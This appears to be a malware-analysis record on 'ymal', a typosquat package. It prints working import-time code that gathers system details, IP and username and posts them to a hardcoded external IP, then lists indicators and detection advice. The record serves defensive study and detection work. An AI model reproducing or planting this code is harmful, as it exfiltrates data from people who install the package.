package_info.why_malicious: The package 'ymal' is a typosquat of the legitimate 'mal' package, uploaded by an author with a pattern of mass-uploading similarly named packages. It contains code that collects sensitive system information (user system, IP, username, computer name) and exfiltrates it to an external server (175.24.100.2:8000), which is not expected or justified for a package of this type. This behavior constitutes clear information theft and supply chain attack tactics.

malicious_snippets.code_snippet:
import platform
import socket
import getpass
import requests

info = {
    'system': platform.system(),
    'node': platform.node(),
    'release': platform.release(),
    'version': platform.version(),
    'machine': platform.machine(),
    'processor': platform.processor(),
    'ip': socket.gethostbyname(socket.gethostname()),
    'user': getpass.getuser()
}

requests.post('http://175.24.100.2:8000', json=info)
malicious_snippets.code_behavior: At import-time, the code collects system information (OS, node/computer name, release, version, machine, processor, local IP, and current username) and sends it via HTTP POST to a hardcoded external IP address (175.24.100.2:8000), enabling exfiltration of host identity data.

malice_analysis.why_suspicious: Collecting and exfiltrating system and user information to an external server is a classic indicator of malicious reconnaissance or data theft. There is no legitimate reason for a package with this name or description to perform such actions.
malice_analysis.violated_expectations: A normal package (especially a typosquat of 'mal') should not collect or transmit host information on import. Legitimate packages only perform their advertised functionality and do not contact external servers without user consent.
malice_analysis.similar_legitimate_use: Some telemetry or crash-reporting libraries may collect system info, but they always disclose this in documentation and allow opt-out.
key_indicators: Hardcoded external IP address for data exfiltration

Collection of sensitive host and user information
No legitimate feature requiring this data transfer

behavioral_signatures: Automatic collection of system and user information at import-time
HTTP/HTTPS POST requests to hardcoded external IPs/domains during package import or installation
Typosquatting: package names closely resembling popular legitimate packages
file_indicators: Presence of code in __init__.py or main module that imports platform, socket, getpass, requests
Hardcoded external IP addresses or suspicious domains in source code
Unusual network activity immediately after package import
network_indicators: Unexpected connections to non-standard or unlisted IPs/domains during package installation/import
detection_knowledge.how_to_detect: Monitor for packages that, upon installation or import, initiate outbound network connections to hardcoded IP addresses or domains, especially those collecting and transmitting system/user information. Use static analysis to flag code that imports system information modules and sends data externally. Cross-reference package names with known legitimate packages to detect typosquatting. Alert on any package that performs network exfiltration without clear, documented purpose.
